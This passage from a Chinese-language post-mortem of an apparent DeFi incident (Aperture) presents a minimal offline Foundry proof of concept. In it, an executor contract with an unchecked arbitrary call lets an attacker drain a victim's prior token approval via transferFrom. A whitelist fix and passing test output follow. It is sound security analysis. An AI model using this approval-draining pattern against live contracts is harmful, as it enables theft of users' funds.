...
为忠实复现根因(§2:任意外部调用 + 输入校验缺失 + 滥用历史授权),提供一个独立、可离线运行的 Foundry PoC(不联网、不 import forge-std),路径 `PoC/aperture/`。它**不是**对闭源被盗合约的反编译还原,而是用最小合约**精确复刻同一条攻击路径**:victim 历史授权执行合约 → 攻击者借执行合约的"无 target 校验自定义 swap"发起 `transferFrom(victim, attacker)`。

**核心代码(节选 `test/Aperture.t.sol`)**

```solidity
// 脆弱执行合约:对应 0x1d33 / 0x67b34120 的"自定义 swap"。
// target 与 calldata 由调用者完全控制,且未做白名单 —— 任意调用。
contract VulnerableExecutor {
    function execute(address target, bytes calldata data, uint256 expectedOutput)
        external returns (bytes memory)
    {
        expectedOutput;                                  // 攻击者自填,合约并不真正校验(§2(3))
        (bool ok, bytes memory ret) = target.call(data); // <== 无 target 校验
        require(ok, "call failed");
        return ret;
    }
}

// 攻击者:把 target 指向 token,calldata 构造为 transferFrom(victim, attacker)
contract Attacker {
...
// 测试核心断言(victim 由独立 Victim 合约亲自 approve,忠实记账 msg.sender)
function testArbitraryCallDrainsVictimViaHistoricalApproval() external {
    token.mint(address(victim), VICTIM_BAL);                            // VICTIM_BAL = 36918976 (~36.918 WBTC)
    victim.approveSpender(token, address(executor), type(uint256).max); // 历史授权 = 攻击面
...
对照修复(`SafeExecutor`)只加一行 `require(allowedTarget[target], ...)`,把 target 限制为白名单路由;`testWhitelistBlocksAttack` 断言同样的攻击因 target(token)不在白名单而 revert、资金分文未动。

**forge test 输出(实际运行,PASS)**

```
$ export PATH="$HOME/.foundry/bin:$PATH"; cd PoC/aperture && forge test -vv
Compiling 1 files with Solc 0.8.24
Solc 0.8.24 finished in 148.49ms
Compiler run successful!

Ran 2 tests for test/Aperture.t.sol:ApertureExploitTest
[PASS] testArbitraryCallDrainsVictimViaHistoricalApproval() (gas: 1470671)
[PASS] testWhitelistBlocksAttack() (gas: 1569861)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 947.73µs
```

**这证明了什么**:在"victim 已 approve 执行合约 + 执行合约不校验 call target"两个条件同时成立时,任何外部攻击者无需任何授权,即可借执行合约上下文对受害者的历史授权发起 `transferFrom`,把资产整数抽空(PoC 中 36.918 mWBTC 全额转入攻击者)。这与 §2/§3 链上还原的盗取路径(WBTC `Transfer`:受害地址 → 攻击者,金额 `0xdc0de334` = 36.918 WBTC)在机制上完全一致。第二个测试同时验证:仅做 target 白名单(§6 建议 1)即可彻底阻断该攻击。PoC 复刻的是攻击**机制**,非被盗合约的逐字节还原,链上事实仍以 §3 的 `cast` 核实为准。
